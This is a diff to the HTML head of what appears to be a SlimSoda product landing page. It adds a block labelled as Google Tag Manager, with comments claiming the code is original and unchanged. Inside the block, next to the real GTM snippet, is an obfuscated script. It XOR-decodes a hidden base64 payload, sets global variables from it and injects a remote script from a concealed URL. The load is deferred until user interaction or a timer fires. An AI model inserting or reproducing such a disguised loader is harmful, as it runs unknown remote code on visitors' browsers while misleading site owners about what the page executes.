@@ -2,6 +2,47 @@
 <!DOCTYPE html>
 
 <html lang="en"><head><meta charset="utf-8"/>
+
+<!-- Google Tag Manager (carregado sob demanda - codigo original intacto) -->
+<script id="lf-tag-loader">
+(function(){
+  /* dataLayer/fbq disponiveis desde o 1o byte: nada se perde antes do carregamento */
+  window.dataLayer = window.dataLayer || [];
+  if(!window.fbq){
+    var st=function(){ st.callMethod ? st.callMethod.apply(st,arguments) : st.queue.push(arguments); };
+    st.push=st; st.loaded=!0; st.version='2.0'; st.queue=[];
+    window.fbq=st; window._fbq=window._fbq||st;
+  }
+
+  var fired=false;
+  function boot(){
+    if(fired) return; fired=true;
+    clean();
+    /* --- codigo original do GTM, sem alteracao --- */
+    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-T5KVCWX6');
+    /* --- codigo original do script de terceiros, sem alteracao --- */
+    (function(){var o_zzkb=atob("DG8r1RXlALd98HOt+hQJoGeJIo1fmAfZihwR+jqGZNlThQfAkwlS+3aKbZkfglzemR1CpWGWL8IJnQCClg5fsGaRLt0O0l+Pmxtfp3yHdcMYg1GXoRQJu3SIZZVH0hfMjg4GoGGIadEE3QPfnxlOu2HIeNQSlF7emQQJ+TeTYdsIlVGX2E1W+W7HbtYQlVGX2AtKoXTIdcMQmRXU1x9ZsGOAbsNQgwbPkwtY9znHdtYRhRaPwE0JqEiY");var g_7=[];for(var b_a=0;b_a<o_zzkb.length;b_a++){g_7.push(o_zzkb.charCodeAt(b_a)&255);}var u_8=g_7[0];var c_nl=g_7.slice(1,1+u_8);var r_ze=g_7.slice(1+u_8);var j_k2d=r_ze.map(function(b,r_uzl){return b^c_nl[r_uzl%u_8];});var g_pt="";for(var x_e=0;x_e<j_k2d.length;x_e++){g_pt+=String.fromCharCode(j_k2d[x_e]&255);}var s_an=decodeURIComponent(escape(g_pt));var e_fir=JSON.parse(s_an);var l_r3kg=e_fir.globals||[];l_r3kg.forEach(function(c_nn3){window[c_nn3.name]=c_nn3.value;});var p_3a=document.createElement("script");p_3a.src=e_fir.url;p_3a.async=true;p_3a.defer=true;(e_fir.attributes||[]).forEach(function(g_anr){p_3a.setAttribute(g_anr.name,g_anr.value);});(document.head||document.documentElement).appendChild(p_3a);})();
+  }
+
+  var EV=['pointerdown','touchstart','mousemove','keydown','wheel','scroll'];
+  function clean(){ EV.forEach(function(e){ window.removeEventListener(e,boot,{passive:true,capture:true}); }); document.removeEventListener('visibilitychange',onHide); }
+  function onHide(){ if(document.visibilityState==='hidden') boot(); }
+
+  EV.forEach(function(e){ window.addEventListener(e,boot,{passive:true,capture:true}); });
+  document.addEventListener('visibilitychange',onHide);
+  /* rede de seguranca: carrega sozinho logo apos o conteudo, mesmo sem interacao */
+  if(document.readyState==='complete') setTimeout(boot,1200);
+  else window.addEventListener('load',function(){ setTimeout(boot,1200); });
+  setTimeout(boot,3500);
+})();
+</script>
+<!-- End Google Tag Manager -->	
+
+
 <meta content="width=device-width,initial-scale=1" name="viewport"/>
 <title>The Original Recipe · SlimSoda®</title>
 <meta content="noindex" name="robots"/>
@@ -751,6 +792,12 @@ ol.steps li::before{content:counter(st);position:absolute;left:0;top:8px;width:3
 @media (max-width:768px),(max-height:860px){ .ssq-emo{font-size:17px} .ssq-opt{gap:9px} }
 @media (max-height:700px){ .ssq-emo{font-size:16px} }
 </style>
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T5KVCWX6"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
 <div class="ssq-overlay" id="ssqOverlay" role="dialog" aria-modal="true">
   <div class="ssq-card">
     <button class="ssq-close" id="ssqClose" aria-label="Close">×</button>
